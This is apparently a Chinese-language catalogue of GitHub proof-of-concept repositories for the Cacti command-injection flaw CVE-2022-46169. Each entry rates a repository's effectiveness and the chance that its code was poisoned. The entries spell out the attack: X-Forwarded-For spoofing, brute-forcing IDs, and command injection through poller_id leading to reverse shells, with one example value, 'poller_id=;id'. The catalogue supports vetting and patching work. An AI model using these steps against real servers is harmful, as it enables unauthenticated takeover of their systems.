**项目地址:** [Safarchand/CVE-2022-46169](https://github.com/Safarchand/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #13

**来源**: [CVE-2022-46169-SystemVll_CVE-2022-46169.md](../2022/CVE-2022-46169-SystemVll_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行Cacti，并且存在action类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前的版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过操控HTTP请求头中的`Forwarded-For`字段，绕过身份验证，然后通过`remote_agent.php`文件中的`polldata`操作，并结合一个action类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`，将恶意命令注入到`proc_open`函数中执行，从而实现远程代码执行。

**漏洞利用方式:**
1.  **身份验证绕过:** 通过设置`Forwarded-For`等HTTP头，伪造客户端IP地址，绕过`remote_agent.php`的身份验证。
2.  **触发命令注入:**  发送带有恶意`poller_id`参数的请求到`remote_agent.php?action=polldata`，该参数会被插入到`proc_open`函数执行的命令中。
3.  **寻找`POLLER_ACTION_SCRIPT_PHP`:**  漏洞利用的前提是存在一个action类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。需要找到对应的`host_id`和`local_data_id`。

**有效性:**
根据漏洞描述，此漏洞利用代码利用了未经授权的远程代理来执行任意系统命令，因此有效。

**投毒风险:**
提供的代码段是 Apache 2.0 许可协议，不包含任何可执行代码或恶意代码，因此投毒风险为0%。核心的PoC代码并没有提供，因此无法判断攻击者是否进行了后门代码验证，只能判断提供的许可协议不存在投毒风险。

**项目地址:** [SystemVll/CVE-2022-46169](https://github.com/SystemVll/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #14

**来源**: [CVE-2022-46169-a1665454764_CVE-2022-46169.md](../2022/CVE-2022-46169-a1665454764_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-远程命令执行

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 远程命令执行

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行Cacti，并且存在具有 'POLLER_ACTION_SCRIPT_PHP' action类型的poller_item。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中的一个未经验证的远程命令执行漏洞。攻击者可以通过构造特定的 HTTP 请求，绕过身份验证，并在目标系统上执行任意命令。

**漏洞利用方式：**

1.  **身份验证绕过：** 攻击者通过设置`X-Forwarded-For`等HTTP Header, 伪造客户端 IP 地址，绕过`remote_agent.php`的身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以通过 `polldata` action，并控制 `poller_id` 参数，将恶意命令注入到 `proc_open` 函数的参数中，从而执行任意系统命令。
3.  **前提条件：** 漏洞利用需要存在一个 `poller_item`，其 `action` 字段设置为 `POLLER_ACTION_SCRIPT_PHP` (值为2)。默认安装的Cacti，很可能存在满足此条件的`poller_item`。
4.  **POC有效性:** 提供的POC代码有效, 利用`remote_agent.php`，设置`X-Forwarded-For` header，构造包含恶意命令的URL,发送请求来执行命令。
5. **投毒风险:** README.md 为漏洞复现步骤，以及github仓库的使用方式说明。POC代码本身除了写入output.txt之外没有发现其他恶意行为。虽然存在一定的风险，例如该代码可能被恶意修改后传播，但当前提供的代码投毒概率较低，大约为1%。该POC的主要功能是检测漏洞是否存在并执行命令，而不是植入后门。

**项目地址:** [a1665454764/CVE-2022-46169](https://github.com/a1665454764/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #15

**来源**: [CVE-2022-46169-alv-david_CVE-2022-46169-Cacti-1.2.22.md](../2022/CVE-2022-46169-alv-david_CVE-2022-46169-Cacti-1.2.22.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti服务可网络访问, 并且存在action类型为POLLER_ACTION_SCRIPT_PHP的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti 1.2.23之前的版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过`remote_agent.php`文件，绕过身份验证，然后利用`polldata`动作，通过构造恶意的`poller_id`参数，执行任意操作系统命令。漏洞利用的关键在于：

1.  **身份验证绕过：** 通过设置`X-Forwarded-For`头，伪造客户端IP地址，绕过`remote_agent.php`的身份验证检查。这是因为`get_client_addr`函数会信任`HTTP_`开头的`$_SERVER`变量，导致可以伪造IP地址。
2.  **命令注入：** 一旦通过身份验证，攻击者可以向`remote_agent.php`发送带有`action=polldata`的请求，其中`poller_id`参数可以被注入恶意命令。程序会将这个参数传递给`proc_open`函数，从而执行攻击者提供的命令。
3.  **利用方式：**  提供的Python脚本首先检查目标是否易受攻击，然后使用提供的LHOST和LPORT生成反向shell有效负载。 脚本通过暴力破解`host_id`和`local_data_ids[]`，构造恶意的URL，发送到目标`remote_agent.php`，从而执行反向shell，从而在目标系统上获得shell访问权限。

**投毒风险分析：**

代码本身主要功能是实现漏洞利用，但仍然存在一定低概率的投毒风险：

*   **潜在的后门：** 虽然代码的主要目的是利用漏洞，但作者可能在payload构建过程中插入了额外的恶意代码，例如，在反向shell payload中添加了额外的命令，用于收集敏感信息或执行其他恶意操作。但是从代码来看，payload是根据用户输入的IP和端口构建的，自定义程度较高，因此payload中存在后门的概率较低。
*   **依赖风险：** 该脚本依赖于`requests`和`urllib`库。虽然这些都是常用的库，但如果这些库本身存在漏洞，或者作者使用了不安全的库函数，可能会引入安全风险。

总体而言，该POC代码的投毒风险较低，约为5%。主要风险在于payload构建过程中可能存在的隐蔽后门，以及对第三方库的依赖。

**项目地址:** [alv-david/CVE-2022-46169-Cacti-1.2.22](https://github.com/alv-david/CVE-2022-46169-Cacti-1.2.22)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #16

**来源**: [CVE-2022-46169-antisecc_CVE-2022-46169.md](../2022/CVE-2022-46169-antisecc_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti实例运行，并且存在`poller_item`记录，其`action`类型为`POLLER_ACTION_SCRIPT_PHP` (2)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中的一个未经身份验证的命令注入漏洞。该漏洞位于 `remote_agent.php` 文件中。攻击者可以通过设置 `X-Forwarded-For` HTTP 头绕过身份验证，然后利用 `polldata` 操作，将恶意命令注入到 `poller_id` 参数中，导致服务器执行任意命令。  

**有效性评估：**

根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，此漏洞利用的**有效性高**。漏洞库和搜索引擎结果都确认了该漏洞的存在和严重性，并且已经有公开的漏洞利用代码可用。提供的 Python 脚本 `CVE-2022-46169.py` 实现了漏洞利用过程，包括绕过身份验证和注入命令。  

**投毒风险分析：**

对提供的 Python 脚本进行分析，该脚本的主要功能是利用 CVE-2022-46169 漏洞，不存在明显的恶意代码或后门。但是，任何利用代码都存在被修改的风险，攻击者可能会在代码中添加恶意功能。考虑到代码量较少，逻辑清晰，用户可以容易地进行审查，因此，**投毒风险较低，估计为5%**。这个风险主要来自使用者没有进行代码审计就直接使用，例如添加反弹shell等恶意操作。

**利用方式：**

1.  **身份验证绕过：** 攻击者发送带有 `X-Forwarded-For` 头的 HTTP 请求到 `remote_agent.php`，伪造客户端 IP 地址，绕过身份验证。
2.  **命令注入：** 攻击者构造包含恶意命令的 `poller_id` 参数，通过 `polldata` 操作传递给 `remote_agent.php`。
3.  **命令执行：** Cacti 服务器在处理 `polldata` 操作时，会将 `poller_id` 参数中的恶意命令注入到 `proc_open` 函数中，导致服务器执行任意命令。

**POC利用方式详细过程:**

1.  运行 `CVE-2022-46169.py` 脚本，指定目标 Cacti 实例的 URL 和要执行的命令。
2.  脚本会遍历一系列 `host_id`，并为每个 `host_id` 构建一个包含恶意 `poller_id` 参数的 HTTP GET 请求。
3.  脚本设置 `X-Forwarded-For` 头，伪造客户端 IP 地址，绕过身份验证。
4.  脚本发送 HTTP 请求到 `remote_agent.php`。
5.  如果目标 Cacti 实例存在具有 `POLLER_ACTION_SCRIPT_PHP` 操作类型的 `poller_item`，并且成功绕过身份验证，则服务器将执行 `poller_id` 参数中的恶意命令。
6.  脚本会检查响应中是否包含 "proc" 字符串，以确认命令是否已成功执行。
7.  如果命令执行成功，脚本将输出成功的消息，并显示成功利用的 `host_id`。

**项目地址:** [antisecc/CVE-2022-46169](https://github.com/antisecc/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #17

**来源**: [CVE-2022-46169-ariyaadinatha_cacti-cve-2022-46169-exploit.md](../2022/CVE-2022-46169-ariyaadinatha_cacti-cve-2022-46169-exploit.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程命令执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti实例配置了 action 类型为 POLLER_ACTION_SCRIPT_PHP (2) 的 poller_item，并且需要网络可达。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti 1.2.23之前的版本中的一个命令注入漏洞。该漏洞允许未经身份验证的攻击者在运行Cacti的服务器上执行任意代码。漏洞存在于`remote_agent.php`文件中，该文件可以通过发送特制的HTTP请求进行访问。攻击者可以通过操纵`X-Forwarded-For` header 绕过身份验证,然后通过 `poller_id`参数执行命令注入。PoC代码利用了这一漏洞，首先验证目标是否存在漏洞，然后暴力破解 `host_id`和 `local_data_id`。 一旦这些ID被找到，攻击者就可以构造包含恶意payload的请求，从而在服务器上执行任意命令。

**有效性:**  提供的PoC代码有效，能够成功利用漏洞实现未经身份验证的远程命令执行。

**投毒风险:**  PoC代码主要功能是漏洞利用，并没有发现明显的恶意投毒代码，例如植入后门、篡改数据等。`cacti.py`脚本的主要功能是：
1.  检测目标是否存在漏洞。
2.  爆破 `host_id` 和 `local_data_id`。
3.  执行命令注入。
代码中唯一的潜在风险点是执行命令注入的payload。如果用户在不知情的情况下使用了危险的payload，可能会对系统造成损害，但是这种风险是用户自身行为造成的，并非代码本身存在恶意。

**利用方式:**
1.  攻击者发送包含`X-Forwarded-For` header的HTTP请求到`remote_agent.php`，绕过身份验证。
2.  攻击者通过暴力破解或其它方式获取可用的 `host_id` 和 `local_data_id`，这些ID对应于`poller_item`表中 `action` 字段为 `POLLER_ACTION_SCRIPT_PHP` (2) 的记录。
3.  攻击者构造包含恶意payload的HTTP请求，通过`poller_id`参数进行命令注入，从而在服务器上执行任意命令。

**项目地址:** [ariyaadinatha/cacti-cve-2022-46169-exploit](https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #18

**来源**: [CVE-2022-46169-copyleftdev_PricklyPwn.md](../2022/CVE-2022-46169-copyleftdev_PricklyPwn.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti服务器存在启用了 POLLER_ACTION_SCRIPT_PHP 的 poller_item

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中的一个命令注入漏洞。未经身份验证的攻击者可以通过操纵 HTTP Header (例如 X-Forwarded-For) 绕过身份验证，并向 remote_agent.php 发送特制的请求，注入恶意命令。漏洞的根本原因是 remote_agent.php 文件中的 polldata 操作在处理 poller_id 参数时，没有进行充分的过滤，导致攻击者可以在 proc_open 函数中执行任意命令。提供的漏洞利用代码 (PricklyPwn) 使用 Go 编写，通过爆破 host_id 和 local_data_ids，构造包含恶意命令的 URL，利用该漏洞获取反向 shell。

**有效性分析：**
漏洞利用代码通过 X-Forwarded-For 头绕过认证, 并爆破`host_id`和`local_data_ids`参数，构造恶意 URL 触发命令注入。根据漏洞信息，利用代码应该是有效的。

**投毒风险分析：**
该仓库包含一个Go编写的漏洞利用程序和一个自述文件。漏洞利用程序的功能是利用 CVE-2022-46169 在 Cacti 上执行命令。Readme文件提供了有关如何使用该漏洞利用程序的信息。虽然代码本身旨在利用已知漏洞，但需要审查是否存在任何隐藏的恶意代码。
*   **main.go:** 代码逻辑清晰，主要功能是构造 Payload 并发送请求以利用漏洞。其中未发现明显的恶意代码。然而，不能完全排除代码中存在细微的后门或漏洞的可能性，例如不正确的错误处理可能导致拒绝服务。
*   **readme.md:** 自述文件只包含有关漏洞利用程序的信息，没有发现任何可疑内容。

考虑到代码主要功能是漏洞利用，但存在一定潜在风险，因此投毒风险评估为10%。

**利用方式：**
1.  攻击者首先需要找到一个存在漏洞的 Cacti 实例 (版本低于 1.2.23)。
2.  攻击者设置`X-Forwarded-For`头为 Cacti 服务器的 IP 地址来绕过身份验证。
3.  攻击者通过爆破`host_id`和`local_data_ids`参数，寻找action类型设置为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。
4.  构造包含恶意命令的 URL，将其作为 poller_id 参数的值传递给 remote_agent.php。
5.  Cacti 服务器执行恶意命令，例如启动反向 shell 连接到攻击者控制的服务器。

**项目地址:** [copyleftdev/PricklyPwn](https://github.com/copyleftdev/PricklyPwn)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #19

**来源**: [CVE-2022-46169-dawnl3ss_CVE-2022-46169.md](../2022/CVE-2022-46169-dawnl3ss_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 目标系统安装Cacti，且存在类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti中一个未经身份验证的命令注入漏洞。漏洞存在于`remote_agent.php`文件中，攻击者可以通过`X-Forwarded-For`头绕过身份验证，然后通过构造恶意的`poller_id`参数，在`poll_for_data`函数中使用`proc_open`执行任意命令。

**有效性：**
提供的PoC代码有效。它首先检查目标是否易受攻击，然后进行暴力破解以查找`host_id`和`local_data_id`，最后构造包含恶意payload的URL来执行命令。

**投毒风险：**
PoC代码本身看起来相对干净，主要功能是利用漏洞。但任何时候都存在一定的风险。漏洞利用代码中存在一定的风险，例如，要求用户输入IP地址和端口，然后构造反向shell的payload。虽然这是漏洞利用的一部分，但用户在复制粘贴代码时可能没有意识到这一点。由于代码的目的是演示漏洞，因此将此定义为恶意投毒是不准确的。风险评估如下：
  * 代码逻辑的直接目的并不是植入后门或执行恶意操作，而是为了演示漏洞利用，大部分操作都需要用户交互。
  * 潜在风险较低，主要体现在用户不理解反向shell的含义，直接运行可能导致自身暴露。
总的来说，投毒风险较低，预估为5%。

**利用方式：**
1.  **身份验证绕过：** 攻击者设置`X-Forwarded-For`头为Cacti服务器的IP地址，绕过`remote_agent.php`的身份验证。
2.  **查找有效ID：** 攻击者暴力破解`host_id`和`local_data_id`，找到`poller_item`表中`action`类型为`POLLER_ACTION_SCRIPT_PHP`的条目。
3.  **命令注入：** 攻击者构造包含恶意命令的`poller_id`参数，发送到`remote_agent.php`，服务器执行该命令。

**结论：** 此漏洞利用风险极高，因为无需身份验证即可远程执行代码。提供的PoC可以有效利用此漏洞，需要及时修补。

**项目地址:** [dawnl3ss/CVE-2022-46169](https://github.com/dawnl3ss/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #20

**来源**: [CVE-2022-46169-devAL3X_CVE-2022-46169_poc.md](../2022/CVE-2022-46169-devAL3X_CVE-2022-46169_poc.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti实例运行，并且存在具有POLLER_ACTION_SCRIPT_PHP action的poller_item。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 存在于 Cacti 1.2.23 之前的版本中。这是一个未经身份验证的命令注入漏洞，允许攻击者在服务器上执行任意代码。攻击者通过伪造 HTTP Header `X-Forwarded-For` 绕过身份验证，然后向 `remote_agent.php` 发送包含恶意 `poller_id` 的 POST 请求，该 `poller_id` 包含要执行的命令。 漏洞利用的关键在于 `remote_agent.php` 中对 `poller_id` 参数的不安全处理，以及对客户端 IP 地址验证的绕过。

提供的 PoC 代码通过 Go 语言实现，利用了该漏洞。它允许指定目标 Cacti 实例的 URL，以及要执行的命令。PoC 代码首先尝试绕过身份验证，然后构造包含恶意命令的 POST 请求。如果成功，服务器将执行该命令，并将结果返回给攻击者。

该PoC未发现明显的投毒代码。主要功能是构造HTTP请求，发送到目标服务器，然后解析返回结果。代码中没有发现任何尝试连接恶意服务器，执行恶意操作或者写入恶意文件的行为。 风险分析基于对提供的PoC代码本身的分析，并不能完全排除其他潜在的风险（例如，如果从不可信的源下载该PoC，则可能存在其他风险）。 因此，为了安全起见，最好人工审核代码，或者从可信的来源获取代码。

**利用方式：**
1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` HTTP Header 为 Cacti 服务器的 IP 地址来绕过身份验证。
2.  **命令注入：** 攻击者构造一个包含恶意命令的 `poller_id` 参数，并通过 POST 请求将其发送到 `remote_agent.php`。
3.  **命令执行：** Cacti 服务器执行 `poller_id` 中包含的命令。

**漏洞利用有效性：**
根据漏洞描述、搜索结果和提供的PoC代码，此漏洞利用是有效的。PoC代码演示了如何利用此漏洞在目标系统上执行任意命令。



**项目地址:** [devAL3X/CVE-2022-46169_poc](https://github.com/devAL3X/CVE-2022-46169_poc)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #21

**来源**: [CVE-2022-46169-devilgothies_CVE-2022-46169.md](../2022/CVE-2022-46169-devilgothies_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti实例存在一个action类型为POLLER_ACTION_SCRIPT_PHP（值为2）的poller_item配置，并且可以通过HTTP访问remote_agent.php页面

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中存在的一个未经身份验证的命令注入漏洞。该漏洞位于 `remote_agent.php` 文件中，攻击者可以通过构造特定的 HTTP 请求头来绕过身份验证，并通过 `poller_id` 参数注入恶意命令。漏洞利用过程如下：

1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` 等 HTTP 头，伪造客户端 IP 地址，使其与 Cacti 服务器本身的 IP 地址匹配。由于 Cacti 验证客户端 IP 地址的方式存在缺陷，攻击者可以绕过身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以向 `remote_agent.php` 发送带有 `action=polldata` 和恶意 `poller_id` 参数的请求。`poller_id` 参数中的值会被插入到 `proc_open` 函数的参数中，从而执行攻击者指定的命令。
3.  **利用代码分析：** 提供的PoC代码首先检查目标是否存在漏洞通过设置`X-Forwarded-For` http头。如果确认存在漏洞，则通过遍历`host_id`和`local_data_ids[]`来寻找配置正确的`poller_item`, 找到后，构造payload，执行反弹shell。
4. **投毒分析：** 检查PoC代码和README.md文件，未发现任何明显的恶意代码或后门。所有的代码都致力于利用此漏洞，没有发现有任何与预期功能不符的部分。因此，投毒风险评估为0%。

**总结：**
该漏洞允许未经身份验证的攻击者在目标系统上执行任意命令，风险极高。提供的PoC代码可以有效地利用该漏洞。该漏洞已被CISA列入已知被利用的漏洞目录（KEV）。

**项目地址:** [devilgothies/CVE-2022-46169](https://github.com/devilgothies/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #22

**来源**: [CVE-2022-46169-doosec101_CVE-2022-46169.md](../2022/CVE-2022-46169-doosec101_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行受影响的Cacti版本，并且存在action类型为POLLER_ACTION_SCRIPT_PHP的poller_item。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169是Cacti中存在的一个未经身份验证的命令注入漏洞。漏洞位于`remote_agent.php`文件中。由于`get_client_addr`函数对客户端IP地址的验证不充分，攻击者可以通过设置`HTTP_`开头的`$_SERVER`变量来伪造IP地址，绕过身份验证。绕过身份验证后，攻击者可以通过`polldata`操作，利用`poller_id`参数中的命令注入漏洞，执行任意系统命令。

**漏洞利用方式：**
1.  攻击者发送包含`Forwarded-For`头部的HTTP请求到`remote_agent.php`，伪造客户端IP地址，绕过身份验证。
2.  攻击者构造包含恶意命令的`poller_id`参数，并将其作为`polldata`操作的一部分发送到`remote_agent.php`。
3.  服务器执行攻击者提供的恶意命令。

**有效性：**
提供的POC代码`CVE-2022-46169.py`是一个简单的漏洞检测脚本，它通过发送包含特定参数的HTTP GET请求到`remote_agent.php`来判断目标系统是否存在漏洞。该脚本并非完整的漏洞利用代码，但它可以用来验证目标系统是否容易受到攻击。

**投毒风险：**
分析了提供的POC代码和相关文件，没有发现明显的恶意代码或后门。`requirements.txt`中列出的依赖项`optparse`, `httpx`, `termcolor` 都是常见的Python库，没有已知的安全问题。作者隐藏的投毒代码可能性较低，风险评估为0%。

**项目地址:** [doosec101/CVE-2022-46169](https://github.com/doosec101/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #23

**来源**: [CVE-2022-46169-icebreack_CVE-2022-46169.md](../2022/CVE-2022-46169-icebreack_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-远程命令执行

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 远程命令执行 (RCE)

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标服务器运行受影响版本的Cacti，且存在一个action类型为POLLER_ACTION_SCRIPT_PHP的poller_item

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Cacti的remote_agent.php文件中。由于对客户端IP地址的验证存在缺陷，未经身份验证的攻击者可以通过设置X-Forwarded-For头部绕过身份验证，然后利用polldata动作中的命令注入漏洞执行任意命令。

**有效性：**
根据漏洞信息和提供的PoC代码，该漏洞是有效的。PoC代码利用了X-Forwarded-For头部的欺骗来绕过身份验证，然后通过构造包含恶意命令的poller_id参数来触发命令注入。

**投毒风险：**
PoC代码本身的功能是利用已知的漏洞进行攻击，并没有发现隐藏的恶意代码或后门。代码的功能较为清晰，主要包括发送HTTP请求、构造Payload等。因此，可以认为投毒风险为0%。

**利用方式：**
1.  攻击者发送包含`X-Forwarded-For`头的HTTP请求到`remote_agent.php`，将该头部设置为Cacti服务器的IP地址，绕过身份验证。
2.  攻击者构造一个包含恶意命令的`poller_id`参数，并将其作为GET请求参数发送到`remote_agent.php?action=polldata`。
3.  `remote_agent.php`在处理`polldata`动作时，会将`poller_id`参数插入到`proc_open`函数调用的命令中，导致命令注入。
4.  攻击者可以通过暴力破解`host_id`和`local_data_ids`参数，找到一个`action`类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`，从而成功执行恶意命令。

**项目地址:** [icebreack/CVE-2022-46169](https://github.com/icebreack/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #24

**来源**: [CVE-2022-46169-lof1sec_CVE-2022-46169.md](../2022/CVE-2022-46169-lof1sec_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti实例存在具有POLLER_ACTION_SCRIPT_PHP（即action类型为2）的poller_item配置，并且攻击者可以访问remote_agent.php

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 存在于Cacti的`remote_agent.php`文件中，允许未经身份验证的攻击者执行任意代码。利用方式如下：

1.  **身份验证绕过：** 攻击者通过伪造`X-Forwarded-For` HTTP头，将其设置为运行Cacti服务器的IP地址，从而绕过身份验证。这是因为`get_client_addr`函数会读取这些HTTP头来确定客户端IP地址，并且之后通过`gethostbyaddr`解析IP地址为主机名，而Cacti服务器自身的主机名通常在`poller`表中存在，导致验证通过。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以利用`polldata`动作，该动作会使用`proc_open`执行PHP脚本。攻击者可以通过`poller_id`参数注入恶意命令。例如，`poller_id=;id`将执行`id`命令。
3.  **前提条件：** 要触发命令注入，必须存在一个`poller_item`，其`action`字段设置为`POLLER_ACTION_SCRIPT_PHP`（值为2）。`host_id`和`local_data_id`可以通过暴力破解找到。

**有效性：**

提供的PoC代码利用了上述漏洞。首先，它检查目标是否容易受到攻击（`checkVuln`函数）。然后，它通过暴力破解（`bruteForce`函数）确定有效的`host_id`和`local_data_id`。最后，它使用精心设计的payload（`remoteCodeExecution`函数）将恶意命令注入到`poller_id`参数中，从而在服务器上执行任意代码。由于CVE细节和搜索结果确认了此漏洞，PoC代码应有效。

**投毒风险：**

查看PoC代码和相关的README文件，未发现任何恶意或可疑的代码。PoC代码仅包含利用CVE-2022-46169漏洞的代码。因此，投毒风险为0%。

**搜索引擎结果：**

搜索引擎结果证实了CVE-2022-46169是一个未经身份验证的命令注入漏洞，影响Cacti的早期版本。多个来源都强调了该漏洞已被积极利用。


**项目地址:** [lof1sec/CVE-2022-46169](https://github.com/lof1sec/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #25

**来源**: [CVE-2022-46169-m3ssap0_cacti-rce-cve-2022-46169-vulnerable-application.md](../2022/CVE-2022-46169-m3ssap0_cacti-rce-cve-2022-46169-vulnerable-application.md)

## CVE-2022-46169 - Cacti 未授权命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意代码

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行受影响的Cacti版本，且存在 action 类型为 POLLER_ACTION_SCRIPT_PHP (2) 的 poller_item 配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中存在的一个未授权命令注入漏洞。攻击者可以通过利用 `remote_agent.php` 文件的认证绕过漏洞，结合 `polldata` 操作，最终实现命令注入。漏洞利用流程如下：

1.  **认证绕过：** 攻击者通过伪造 `HTTP_` 请求头（例如 `Forwarded-For`），使得 `get_client_addr` 函数返回 Cacti 服务器自身的 IP 地址。这样，后续的 hostname 检查会被绕过，从而无需认证即可访问 `remote_agent.php`。
2.  **触发 polldata 操作：** 成功绕过认证后，攻击者可以调用 `remote_agent.php` 的 `polldata` 操作。
3.  **命令注入：** `poll_for_data` 函数从请求参数中获取 `poller_id`，该参数没有经过充分过滤，直接拼接到 `proc_open` 函数的参数中，导致命令注入。
4.  **条件：** 漏洞触发需要数据库中存在 action类型为`POLLER_ACTION_SCRIPT_PHP` (`2`)的`poller_item`。

**POC 代码分析：**

提供的 Dockerfile 构建了一个易受攻击的 Cacti 1.2.22 环境，用于漏洞测试。该 Dockerfile 主要完成了以下工作：

*   安装必要的依赖项，例如 `rrdtool`、`mariadb-server`、`snmp` 等。
*   配置 PHP 扩展。
*   从 GitHub 克隆 Cacti 1.2.22 版本的代码。
*   配置 Cacti 数据库和初始化脚本。
*   配置 cron 任务来运行 `poller.php`。

**有效性评估：**

根据漏洞描述和 POC 代码，可以判断该漏洞利用的有效性很高。POC 代码提供了一个可复现的环境，方便研究人员进行漏洞测试和利用。

**投毒风险评估：**

该存储库中的投毒风险较低（约 5%）。理由如下：

*   Dockerfile 内容清晰：Dockerfile 中的指令主要用于构建 Cacti 运行环境，没有发现任何可疑的恶意代码或后门。 *   cacti.sql 来源于官方github仓库，该文件被篡改风险较低。 *   config.php主要是数据库配置，不具备投毒条件。
*   README.md 包含警告信息：该文件明确指出此应用包含安全漏洞，并建议在受保护的环境中运行，降低了恶意使用的可能性。
